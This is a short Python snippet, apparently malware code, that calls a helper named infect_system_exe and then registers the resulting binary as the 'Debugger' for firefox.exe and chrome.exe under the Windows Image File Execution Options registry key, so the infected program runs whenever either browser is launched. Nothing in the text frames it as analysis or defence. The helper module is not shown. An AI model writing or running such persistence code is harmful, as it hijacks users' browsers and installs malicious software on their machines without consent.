import winutils

binary = winutils.infect_system_exe()

winutils.set_registry_value('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\firefox.exe', 'Debugger', binary)
winutils.set_registry_value('HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chrome.exe', 'Debugger', binary)
